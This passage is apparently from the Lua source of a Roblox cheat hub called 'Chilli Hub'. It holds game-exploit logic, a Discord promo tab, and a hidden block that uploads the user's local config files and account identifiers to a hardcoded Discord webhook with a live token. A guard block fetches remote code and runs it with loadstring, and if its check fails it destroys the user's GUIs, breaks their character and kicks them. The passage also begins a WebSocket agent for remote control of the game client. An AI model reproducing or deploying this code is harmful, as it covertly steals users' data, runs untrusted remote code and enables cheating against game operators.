		if fn37(v20) and v17.Limp ~= false then
			humanoid.PlatformStand = true
		end

		local v22 = position

		for _, v23 in ipairs(v18) do
			local flag5 = type(v23) ~= "table"

			if not flag5 then
				flag5 = not fn37(tonumber(v23.At) or 0)
			end

			if not flag5 then
				local flag6 = v23.To == "start" and position or fn36(v21)
				local v24 = fn35()

				if type(v23.Glide) == "table" and #v23.Glide > 0 then
					for _, v25 in ipairs(v23.Glide) do
						if fn34() then
							local clamp = math.clamp
							local n15 = tonumber(v25) or 1
							local v26 = fn23
							local lerp = v22.Lerp
							local v27 = clamp(n15, 0, 1)
							v26(character, v16, lerp(v22, flag6, v27), v24, flag4)
							RunService.Heartbeat:Wait()
							continue
						end

						break
					end

					v22 = flag6
				else
					fn38(flag6, v24)
					v22 = flag6
				end

				continue
			end

			break
		end

		fn37(v19)

		pcall(function()
			humanoid.PlatformStand = platformStand
		end)

		fn21()
		fn30()

		if fn34() and tbl19.Carrying then
			fn17(tbl16.Good, 1.6)
		else
			fn17(tbl16.Bad, 1.6)
		end
	end

	local function fn34(arg)
		if not pcall(fn33, arg) then
			pcall(function()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false
				end
			end)

			fn21()
			fn30()
			fn17(tbl16.Bad, 1.6)
		end
	end

	local n14 = 25

	local function fn35()
		if antiGuard.HitArms <= 0 then
			return false
		end

		if os.clock() - (antiGuard.HitArmedAt or 0) > n14 then
			antiGuard.HitArms = 0
			return false
		end
		return true
	end

	local function fn36()
		local carrying = tbl19.Carrying
		tbl19.Carrying = tbl19.SignalCarrying or tbl19.WeldCarrying

		if tbl19.Carrying and not carrying and flag3 and antiGuard.Enabled and not tbl19.Active and not fn35() then
			tbl19.Active = true
			antiGuard.Busy = true
			antiGuard.BusySince = os.clock()
			task.spawn(fn34, os.clock())
		end
	end

	local eggState = tbl.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
			local signalCarrying = type(arg) == "table" and arg.IsCarrying == true

			if signalCarrying and arg.GuardDisabled == true then
				signalCarrying = false
			end

			if signalCarrying and type(arg.AreaId) == "string" then
				tbl19.AreaId = arg.AreaId
			end

			if not signalCarrying then
				tbl19.AreaId = nil
			end

			tbl19.SignalCarrying = signalCarrying
			fn36()
		end)

		if ok and result then
			tbl18[#tbl18 + 1] = result
		end
	end

	local n15 = 0

	tbl18[#tbl18 + 1] = RunService.Heartbeat:Connect(function(deltaTime)
		local busy = antiGuard.Busy or tbl19.Active

		if busy then
			local busySince = antiGuard.BusySince
			busy = os.clock() - busySince > math.max(tonumber(fn26().BusyLimit) or tbl15.BusyLimit, (tonumber(fn26().ReleaseAt) or 0) + 1)
		end

		if busy then
			fn21()
			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.PlatformStand then
				pcall(function()
					humanoid.PlatformStand = false
				end)
			end

			fn30()
		end

		fn35()
		n15 += deltaTime
		if n15 < tbl15.WeldScanGap then
			return
		end
		n15 = 0
		local weldCarrying = fn18() ~= nil

		if weldCarrying ~= tbl19.WeldCarrying then
			tbl19.WeldCarrying = weldCarrying
			fn36()
		end
	end)

	fn4(function()
		flag3 = false

		for _, v16 in ipairs(tbl18) do
			pcall(function()
				v16:Disconnect()
			end)
		end

		table.clear(tbl18)
		fn21()
		fn30()
		antiGuard.Render = nil
		antiGuard.ShowPanel = nil

		pcall(function()
			ScreenGui:Destroy()
		end)
	end)
end

do
	local v16 = v2:CreateTab({ Name = "Discord", Side = "Right", SectionsExpanded = true }):CreateSection({ Name = "Community", Expanded = true })
	local str = "discord.gg/CJK4bs2mgT"
	local str2 = "rbxassetid://128961717706452"
	local n14 = 0.5
	local n15 = 0.0909
	local n16 = 0.2
	local n17 = 5.4
	local n18 = 4.2
	local n19 = 5.2
	local n20 = 6
	local n21 = 3.6
	local n22 = 6.4
	local n23 = 2
	local n24 = 11.4
	local n25 = 3
	local n26 = 0.35

	local tbl20 = {
		{
			Color = "#FF6A55",
			Title = "New Scripts &amp; Updates",
			Text = "Patch notes and new game scripts are posted there first.",
		},
		{
			Color = "#FFB054",
			Title = "Giveaways",
			Text = "Member giveaways and events are announced in the server.",
		},
		{
			Color = "#9AA3FF",
			Title = "Support",
			Text = "Ask for help, report bugs and get answers from the team.",
		},
		{
			Color = "#6EE49C",
			Title = "Suggestions",
			Text = "Request features and vote on what gets added next.",
		},
	}

	local n27 = n24 + #tbl20 * (n25 + n26) + 2.4 + n16 * 2
	local colorSequence = ColorSequence.new
	local tbl21 = {}
	local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 218, 96))
	local v18 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 152, 60))
	local new = ColorSequenceKeypoint.new
	local color3 = Color3.fromRGB
	tbl21[1] = v17
	tbl21[2] = v18

	do
		local values = table.pack(new(1, color3(255, 82, 64)))
		table.move(values, 1, values.n, 3, tbl21)
	end

	local v19 = colorSequence(tbl21)
	local color4 = Color3.fromRGB
	local colorSequence2 = ColorSequence.new(Color3.fromRGB(74, 24, 18), color4(14, 11, 15))
	local tbl22 = { Perks = {} }
	local n28 = 0

	local function fn18()
		local v20 = setclipboard or toclipboard
		local ok = type(v20) == "function" and pcall(v20, "https://discord.gg/CJK4bs2mgT") or false
		fn14(ok and "Discord Link Copied" or "Discord Link", "https://discord.gg/CJK4bs2mgT")
		if not tbl22.Copy then
			return
		end
		n28 += 1
		local v21 = n28

		tbl22.Copy.Set({
			Text = ok and "<b>Copied!</b>" or "<b>See Notice</b>",
			Background = ok and "#2EB070" or "#5865F2",
		})

		task.delay(1.8, function()
			if v21 == n28 and tbl22.Copy then
				tbl22.Copy.Set({ Text = "<b>Copy Link</b>", Background = "#5865F2" })
			end
		end)
	end

	local function fn19(arg)
		if not tbl22.Hero then
			return
		end
		local n29 = n16 * 2
		local n30 = math.max(arg, 14) - n29
		local n31 = math.max(1, n30 - n19 - n14)
		local n32 = math.max(1, n30 - n22 - n14 * 3)
		local n33 = math.max(1, n30 - 1.2)
		tbl22.Hero.Set({ Width = n30 })
		tbl22.Title.Set({ Width = n31 })
		tbl22.Subtitle.Set({ Width = n31 })
		tbl22.Members.Set({ Width = n31 })
		tbl22.Invite.Set({ Width = n30 })
		tbl22.Label.Set({ Width = n32 })
		tbl22.Link.Set({ Width = n32 })
		tbl22.Copy.Set({ X = n30 - n22 - n14 })
		tbl22.Header.Set({ Width = n30 })

		for _, perk in ipairs(tbl22.Perks) do
			perk.Frame.Set({ Width = n30 })
			perk.Title.Set({ Width = n33 })
			perk.Text.Set({ Width = n33 })
		end

		tbl22.Tip.Set({ Width = n30 })
	end

	local function fn20(arg)
		tbl22.Hero = arg:Frame({
			Name = "Hero",
			X = n16,
			Y = n16,
			Width = 14,
			Height = n17,
			Background = "#FFFFFF",
			Gradient = colorSequence2,
			GradientRotation = 0,
			Corner = 0.35,
			StrokeColor = "#FF6A40",
			StrokeThickness = n15,
			StrokeTransparency = 0.55,
		})

		tbl22.Logo = arg:Image({
			Parent = tbl22.Hero,
			X = 0.5,
			Y = (n17 - n18) / 2,
			Width = n18,
			Height = n18,
			Image = str2,
		})

		tbl22.Title = arg:Text({
			Parent = tbl22.Hero,
			X = n19,
			Y = 0.45,
			Width = 1,
			Height = 1.6,
			Scale = 1.45,
			Wrap = false,
			Text = "<b>Chilli Hub</b>",
			Gradient = v19,
			GradientRotation = 0,
			TextStrokeTransparency = 1,
		})

		tbl22.Subtitle = arg:Text({
			Parent = tbl22.Hero,
			X = n19,
			Y = 2.1,
			Width = 1,
			Height = 1,
			Wrap = false,
			Text = "Official Discord Community",
			Color = "#DCDCE8",
		})

		tbl22.Members = arg:Text({
			Parent = tbl22.Hero,
			X = n19,
			Y = 3.3,
			Width = 1,
			Height = 1.2,
			Wrap = false,
			Text = string.format("<font color=\"#6EE49C\">%s</font>  <b>%s</b>  <font color=\"#B8B8CC\">Members</font>", utf8.char(9679), "130K+"),
		})

		tbl22.Invite = arg:Frame({
			Name = "Invite",
			X = n16,
			Y = n20 + n16,
			Width = 14,
			Height = n21,
			Background = "#000000",
			BackgroundTransparency = 0.5,
			Corner = 0.35,
			StrokeColor = "#5865F2",
			StrokeThickness = n15,
			StrokeTransparency = 0.35,
		})

		tbl22.Label = arg:Text({
			Parent = tbl22.Invite,
			X = n14 + 0.1,
			Y = 0.35,
			Width = 1,
			Height = 0.9,
			Scale = 0.78,
			Wrap = false,
			Text = "<b>INVITE LINK</b>",
			Color = "#9C9CB4",
		})

		tbl22.Link = arg:Text({
			Parent = tbl22.Invite,
			X = n14 + 0.1,
			Y = 1.35,
			Width = 1,
			Height = 1.6,
			Scale = 1.05,
			Wrap = false,
			Font = "code",
			Text = str,
		})

		tbl22.Copy = arg:Button({
			Parent = tbl22.Invite,
			X = 14 - n22 - n14,
			Y = (n21 - n23) / 2,
			Width = n22,
			Height = n23,
			Text = "<b>Copy Link</b>",
			Color = "#FFFFFF",
			Scale = 1,
			Background = "#5865F2",
			BackgroundTransparency = 0,
			HoverTransparency = 0.15,
			PressTransparency = 0.3,
			StrokeColor = "#9AA3FF",
			StrokeThickness = n15,
			Corner = 0.3,
			Callback = fn18,
		})

		tbl22.Header = arg:Text({
			X = n16 + 0.1,
			Y = n24 - 1.15 + n16,
			Width = 14,
			Height = 1,
			Scale = 0.8,
			Wrap = false,
			Text = "<b>WHAT YOU GET</b>",
			Color = "#9C9CB4",
		})

		for i, v20 in ipairs(tbl20) do
			local tbl23 = {
				Frame = arg:Frame({
					Name = "Perk",
					X = n16,
					Y = n24 + (i - 1) * (n25 + n26) + n16,
					Width = 14,
					Height = n25,
					Background = "#000000",
					BackgroundTransparency = 0.68,
					Corner = 0.35,
				}),
			}

			tbl23.Accent = arg:Frame({
				Parent = tbl23.Frame,
				X = 0.3,
				Y = 0.45,
				Width = 0.22,
				Height = n25 - 0.9,
				Background = v20.Color,
				Corner = 0.11,
			})

			tbl23.Title = arg:Text({
				Parent = tbl23.Frame,
				X = 0.85,
				Y = 0.3,
				Width = 1,
				Height = 1.1,
				Wrap = false,
				Text = "<b>" .. v20.Title .. "</b>",
				Color = v20.Color,
			})

			tbl23.Text = arg:Text({
				Parent = tbl23.Frame,
				X = 0.85,
				Y = 1.35,
				Width = 1,
				Height = 1.5,
				Scale = 0.86,
				Wrap = true,
				Text = v20.Text,
				Color = "#C8C8D8",
			})

			tbl22.Perks[i] = tbl23
		end

		tbl22.Tip = arg:Text({
			X = n16 + 0.1,
			Y = n27 - 2.2 - n16,
			Width = 14,
			Height = 2,
			Scale = 0.8,
			Wrap = true,
			Text = "Paste the copied link into your browser or the Discord app to join.",
			Color = "#8A8AA2",
		})

		arg:SetContentLines(n27)

		arg:OnResize(function(arg2, arg3, arg4)
			fn19(arg3 / math.max(arg4, 1))
		end)

		local max = math.max
		fn19(arg:Width() / max(arg:Unit(), 1))
	end

	if type(v16.CreateCanvas) == "function" then
		local v20 = v16:CreateCanvas({
			Name = "Discord",
			ShowTitle = false,
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = math.ceil(n27),
				MaxLines = math.ceil(n27),
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = fn20,
		})

		fn4(function()
			v20:Destroy()
		end)
	else
		v16:CreateText({ Name = "Discord", Text = "https://discord.gg/CJK4bs2mgT" })
	end

	if type(v16.CreateButton) == "function" then
		v16:CreateButton({ Name = "Copy Discord Link", Callback = fn18 })
	end
end

do
	local image = "rbxassetid://128961717706452"
	local n14 = 56
	local n15 = 0.035
	local n16 = 8
	local tweenInfo = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tweenInfo2 = TweenInfo.new(0.14, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local TweenService = game:GetService("TweenService")
	local tbl20 = {}
	local screenGui = nil
	local uiScale = nil
	local uiScale2 = nil

	local function fn18()
		for _, v16 in ipairs({ "Toggle", "Open" }) do
			local ok, result = pcall(function()
				return v2[v16]
			end)

			if ok and type(result) == "function" then
				pcall(result, v2)
				return
			end
		end
	end

	local function fn19()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n15 / n14, 0.7, 1.4)
	end

	local function fn20()
		for _, v16 in ipairs(tbl20) do
			pcall(function()
				v16:Disconnect()
			end)
		end

		table.clear(tbl20)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		uiScale = nil
		uiScale2 = nil
	end

	local function fn21()
		fn20()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 59
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.AnchorPoint = Vector2.new(0, 0.5)
		frame.Position = UDim2.new(0, 16, 0.3, 0)
		frame.Size = UDim2.fromOffset(56, 56)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = screenGui
		uiScale = Instance.new("UIScale")
		uiScale.Name = fn3()
		uiScale.Parent = frame
		fn19()
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = fn3()
		imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
		imageButton.Position = UDim2.fromScale(0.5, 0.5)
		imageButton.Size = UDim2.fromScale(1, 1)
		imageButton.BackgroundTransparency = 1
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.Image = image
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.Active = true
		imageButton.Parent = frame
		uiScale2 = Instance.new("UIScale")
		uiScale2.Name = fn3()
		uiScale2.Parent = imageButton
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = fn3()
		uiCorner.CornerRadius = UDim.new(0.28, 0)
		uiCorner.Parent = imageButton

		local function fn22(arg, arg2)
			if uiScale2 then
				TweenService:Create(uiScale2, arg2, { Scale = arg }):Play()
			end
		end

		local function fn23(arg)
			local absoluteSize = screenGui.AbsoluteSize
			local absoluteSize2 = frame.AbsoluteSize
			if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
				return arg
			end
			local n17 = arg.Y.Offset + arg.Y.Scale * absoluteSize.Y
			local n18 = math.clamp(arg.X.Offset + arg.X.Scale * absoluteSize.X, 0, math.max(0, absoluteSize.X - absoluteSize2.X))
			local n19 = math.clamp(n17, absoluteSize2.Y * 0.5, math.max(absoluteSize2.Y * 0.5, absoluteSize.Y - absoluteSize2.Y * 0.5))
			return UDim2.fromOffset(n18, n19)
		end

		local str = nil
		local vector2 = nil
		local position = nil
		local flag4 = false
		local flag5 = false

		local function fn24(arg, arg2)
			if str == "mouse" then
				return arg.UserInputType == (arg2 and Enum.UserInputType.MouseMovement or Enum.UserInputType.MouseButton1)
			end
			return arg == str
		end

		tbl20[#tbl20 + 1] = imageButton.InputBegan:Connect(function(input)
			local flag6 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag6 or input.UserInputState ~= Enum.UserInputState.Begin or str then
				return
			end
			str = flag6 and input or "mouse"
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
			flag4 = false
			flag5 = false
			fn22(0.9, tweenInfo)
		end)

		tbl20[#tbl20 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not str or not fn24(input, true) then
				return
			end
			local n17 = Vector2.new(input.Position.X, input.Position.Y) - vector2

			if not flag4 then
				if n17.Magnitude < n16 then
					return
				end
				flag4 = true
				flag5 = true
				fn22(1, tweenInfo2)
			end

			frame.Position = fn23(UDim2.new(position.X.Scale, position.X.Offset + n17.X, position.Y.Scale, position.Y.Offset + n17.Y))
		end)

		tbl20[#tbl20 + 1] = UserInputService.InputEnded:Connect(function(input)
			if str and fn24(input, false) then
				str = nil
				flag4 = false
				fn22(1, tweenInfo2)
			end
		end)

		tbl20[#tbl20 + 1] = imageButton.Activated:Connect(function()
			if flag5 then
				flag5 = false
				return
			end
			fn18()
		end)

		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			tbl20[#tbl20 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn19)
		end

		screenGui.Parent = v3
	end

	fn21()
	fn4(fn20)
end

v:Finalize({ Window = v2, MainTab = defaultTab, ShowMainTab = true })

task.defer(function()
	for i = 1, 3 do
		RunService.Heartbeat:Wait()
	end

	if type(tbl3.RestoreStealPanel) == "function" then
		pcall(tbl3.RestoreStealPanel)
	end
end)

do
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	local request_ = syn and syn.request or http and http.request or http_request or request
	local str = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
	local str2 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local str3 = "Default"
			local v16 = nil
			local str4 = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag4 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, "ChilliLibrary/config_state.json")

						if ok and not result then
							flag4 = false
						end
					end

					if flag4 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str3 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str3 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str5 = "ChilliLibrary/configs/" .. str3 .. ".json"
					local flag4 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, str5)

						if ok and not result then
							flag4 = false
						end
					end

					if flag4 then
						v16 = readfile_(str5)
						str4 = str3 .. ".json"
					end

					if (not v16 or v16 == "") and str3 ~= "Default" then
						local flag5 = true

						if type(isfile_) == "function" then
							local ok, result = pcall(isfile_, "ChilliLibrary/configs/Default.json")
							local flag6 = ok and not result
							local flag7 = true

							if flag6 then
								flag5 = false
							else
								flag5 = flag7
							end
						end

						if flag5 then
							local ok, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								v16 = result
								str4 = "Default.json"
							end
						end
					end
				end)
			end

			local str5 = tostring(str4):gsub("[<>:\"/\\|?*]", "_")

			if not str5:match("%.json$") then
				str5 ..= ".json"
			end

			local str6 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str2, v16 and v16 ~= "" and " | Startup Config: **" .. str3 .. "**" or "")
			local flag4 = false

			if v16 and v16 ~= "" then
				pcall(function()
					local str7 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str8 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str5 .. "\"\r\n"
					local str9 = v16 .. "\r\n"

					local v17 = request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str7 },
						Body = table.concat({
							"--" .. str7 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = str6 }) .. "\r\n",
							"--" .. str7 .. "\r\n",
							str8,
							"Content-Type: application/json\r\n\r\n",
							str9,
							"--" .. str7 .. "--\r\n",
						}),
					})

					local flag5 = type(v17) == "table"
					local flag6

					if flag5 then
						flag6 = v17.StatusCode == 200 or v17.StatusCode == 204 or v17.Success == true
					else
						flag6 = flag5
					end

					if flag6 then
						flag4 = true
					end
				end)
			end

			if not flag4 then
				pcall(function()
					request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService2:JSONEncode({ content = str6 }),
					})
				end)
			end
		end)
	end
end

task.spawn(function()
	task.wait(20)
	local str = "\0chilli_guard"
	local genv = typeof(getgenv) == "function" and getgenv() or _G

	local function fn18()
		local v16 = genv[str]
		if type(v16) == "table" and type(v16.Ask) == "function" then
			return v16
		end
		return nil
	end

	local v16 = fn18()

	if not v16 then
		task.spawn(function()
			local v17 = nil

			for i = 1, 4 do
				task.wait()

				local ok, result = pcall(function()
					local v18 = v17
					local response

					if v17 then
						response = v18
					else
						response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
					end

					v17 = response
					local chunk, v19 = loadstring(v17)
					assert(chunk, v19)
					return chunk()
				end)

				if ok then
					fn("guard: loader ran on try " .. i)
					return
				end

				if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
					v17 = nil
				end

				fn("guard: loader try " .. i .. " failed: " .. tostring(result))
				task.wait(1 + i)
			end
		end)

		local n14 = os.clock() + 30

		while true do
			task.wait(0.25)
			v16 = fn18()
			if not (v16 or os.clock() > n14) then
				continue
			end
			break
		end
	end

	local flag4 = false

	if v16 then
		local result
		flag4, result = pcall(v16.Ask, "v202")
		flag4 = flag4 and type(result) == "string" and #result > 0
	end

	genv[str] = nil
	if flag4 then
		return
	end

	pcall(function()
		local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

		if type(chilliHubSaeCleanup) == "function" then
			chilliHubSaeCleanup()
		end
	end)

	genv.ChilliHubSaeCleanup = nil

	pcall(function()
		local Players2 = game:GetService("Players")
		local tbl20 = { game:GetService("CoreGui") }

		if typeof(gethui) == "function" then
			local ok, result = pcall(gethui)

			if ok and typeof(result) == "Instance" then
				table.insert(tbl20, result)
			end
		end

		local playerGui = Players2.LocalPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			table.insert(tbl20, playerGui)
		end

		for _, v17 in ipairs(tbl20) do
			for _, child in ipairs(v17:GetChildren()) do
				if child:IsA("ScreenGui") then
					pcall(function()
						child:Destroy()
					end)
				end
			end
		end
	end)

	pcall(function()
		rawset(_G, "__ChilliAutoLoadQueued", nil)

		if type(queue_on_teleport) == "function" then
			queue_on_teleport("")
		elseif type(queueonteleport) == "function" then
			queueonteleport("")
		end
	end)

	pcall(function()
		local character = game:GetService("Players").LocalPlayer.Character

		if character then
			character:BreakJoints()
		end
	end)

	pcall(function()
		game:GetService("Players").LocalPlayer:Kick("\u{200B}")
	end)
end)

local HttpService2
HttpService2 = game:GetService("HttpService")
local Players2
Players2 = game:GetService("Players")
local RunService2
RunService2 = game:GetService("RunService")
local Workspace
Workspace = game:GetService("Workspace")
local str
str = "skyb0y-ws-2025"
local n14
n14 = 2
local flag4, flag5, localPlayer2, genv, flag6, flag7, v16, n15, n16, tbl20
local tbl21, tbl22, n17, fn18, fn19, fn20, fn21, fn22, fn23, fn24
local fn25, fn26, fn27, fn28

do
	local n18 = 7
	local n19 = 500
	local n20 = 245760
	local flag8 = false
	flag4 = false
	flag5 = false
	localPlayer2 = Players2.LocalPlayer
	genv = getgenv and getgenv() or _G

	if type(genv.StopRobloxMCPAgent) == "function" then
		pcall(genv.StopRobloxMCPAgent)
	end

	flag6 = true
	flag7 = false
	v16 = nil
	n15 = 0
	n16 = 2
	tbl20 = {}
	tbl21 = {}
	tbl22 = {}
	n17 = 0

	fn18 = function(...)
		if flag8 then
			print("[ROBLOX MCP]", ...)
		end
	end

	fn19 = function(...)
		if flag8 then
			warn("[ROBLOX MCP]", ...)
		end
	end

	fn20 = function(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	fn21 = function(arg, arg2, arg3, arg4)
		local num = tonumber(arg)
		if not num then
			return arg4
		end
		return math.max(arg2, math.min(arg3, num))
	end

	fn22 = function(arg)
		for _, v17 in ipairs(arg) do
			pcall(function()
				v17:Disconnect()
			end)
		end

		table.clear(arg)
	end

	fn23 = function()
		if syn and syn.websocket and type(syn.websocket.connect) == "function" then
			return syn.websocket.connect, "syn.websocket.connect"
		end

		if WebSocket and type(WebSocket.connect) == "function" then
			return WebSocket.connect, "WebSocket.connect"
		end

		if WebSocket and type(WebSocket.new) == "function" then
			return WebSocket.new, "WebSocket.new"
		end

		if WebSocket and type(WebSocket.New) == "function" then
			return WebSocket.New, "WebSocket.New"
		end

		if websocket and type(websocket.connect) == "function" then
			return websocket.connect, "websocket.connect"
		end

		if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
			return syn.WebSocket.new, "syn.WebSocket.new"
		end
		return nil, nil
	end

	fn24 = function(arg, ...)
		local v17 = table.pack(...)

		for i = 1, select("#", ...) do
			local value = select(i, table.unpack(v17, 1, v17.n))

			local ok, result = pcall(function()
				return arg[value]
			end)

			if ok and result ~= nil then
				return result, value
			end
		end

		return nil, nil
	end

	fn25 = function(arg, arg2)
		if not arg then
			return nil
		end

		local ok, result = pcall(function()
			return arg:Connect(arg2)
		end)

		return ok and result or nil
	end

	fn26 = function(arg)
		if typeof(arg) ~= "Instance" then
			return nil
		end

		local ok, result = pcall(function()
			return arg:GetFullName()
		end)

		return ok and result or arg.Name
	end

	fn27 = nil

	fn27 = function(arg, arg2, arg3)
		arg2 = arg2 or 0
		arg3 = arg3 or {}
		if n18 < arg2 then
			return "<max-depth>"
		end
		local kind = typeof(arg)
		if arg == nil or kind == "string" or kind == "boolean" then
			return arg
		end

		if kind == "number" then
			if arg ~= arg or arg == math.huge or arg == -math.huge then
				return tostring(arg)
			end
			return arg
		end

		if kind == "Instance" then
			return { type = "Instance", className = arg.ClassName, name = arg.Name, path = fn26(arg) }
		end

		if kind == "Vector2" then
			return { type = "Vector2", x = arg.X, y = arg.Y }
		end

		if kind == "Vector3" then
			return { type = "Vector3", x = arg.X, y = arg.Y, z = arg.Z }
		end

		if kind == "Color3" then
			return {
				type = "Color3",
				r = math.floor(arg.R * 255 + 0.5),
				g = math.floor(arg.G * 255 + 0.5),
				b = math.floor(arg.B * 255 + 0.5),
			}
		end

		if kind == "UDim" then
			return { type = "UDim", scale = arg.Scale, offset = arg.Offset }
		end

		if kind == "UDim2" then
			return {
				type = "UDim2",
				xScale = arg.X.Scale,
				xOffset = arg.X.Offset,
				yScale = arg.Y.Scale,
				yOffset = arg.Y.Offset,
			}
		end

		if kind == "CFrame" then
			return { type = "CFrame", components = { arg:GetComponents() } }
		end

		if kind == "EnumItem" then
			return tostring(arg)
		end

		if kind == "BrickColor" then
			return { type = "BrickColor", name = arg.Name, number = arg.Number }
		end

		if kind == "table" then
			if arg3[arg] then
				return "<cycle>"
			end
			arg3[arg] = true
			local n21 = 0
			local flag9 = true
			local n22 = 0

			for k in pairs(arg) do
				n21 += 1

				if not (n19 < n21) then
					if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
						flag9 = false
					elseif n22 < k then
						n22 = k
					end

					continue
				end

				break
			end

			local tbl23

			if flag9 and n22 <= n19 then
				tbl23 = {}

				for i = 1, n22 do
					tbl23[i] = fn27(arg[i], arg2 + 1, arg3)
				end
			else
				tbl23 = {}
				local v17, v18, v19 = pairs(arg)
				local n23 = 0

				for k, v20 in v17, v18, v19 do
					n23 += 1

					if n19 < n23 then
						tbl23.__truncated = true
						break
					else
						tbl23[tostring(k)] = fn27(v20, arg2 + 1, arg3)
					end
				end
			end

			arg3[arg] = nil
			return tbl23
		end

		return tostring(arg)
	end

	fn28 = function(arg)
		if not flag7 or not v16 then
			return false, "not connected"
		end

		local ok, result = pcall(function()
			return HttpService2:JSONEncode(fn27(arg))
		end)

		if not ok then
			return false, "JSON encode failed: " .. tostring(result)
		end

		if n20 < #result then
			if not (type(arg) == "table" and arg.type == "rpc_result") then
				return false, "message too large"
			end

			result = HttpService2:JSONEncode({
				type = "rpc_result",
				requestId = arg.requestId,
				success = false,
				error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
			})
		end

		local ok2, result2 = pcall(function()
			v16:Send(result)
		end)

		if not ok2 then
			return false, "WebSocket send failed: " .. tostring(result2)
		end
		return true
	end
end

local fn29

fn29 = function(arg, arg2)
	fn28({ type = "rpc_event", event = arg, data = arg2 or {} })
end

local fn30

do
	local tbl23 = {
		Game = game,
		game = game,
		Workspace = Workspace,
		workspace = Workspace,
		Players = Players2,
		Lighting = game:GetService("Lighting"),
		ReplicatedStorage = game:GetService("ReplicatedStorage"),
		ReplicatedFirst = game:GetService("ReplicatedFirst"),
		StarterGui = game:GetService("StarterGui"),
		StarterPlayer = game:GetService("StarterPlayer"),
		SoundService = game:GetService("SoundService"),
		Teams = game:GetService("Teams"),
		LocalPlayer = localPlayer2,
	}

	local function fn31(arg)
		local tbl24 = {}

		for match in fn20(arg):gmatch("[^%.]+") do
			table.insert(tbl24, match)
		end

		return tbl24
	end

	fn30 = function(arg)
		local v17 = fn31(arg)
		if #v17 == 0 then
			return nil, "path is empty"
		end
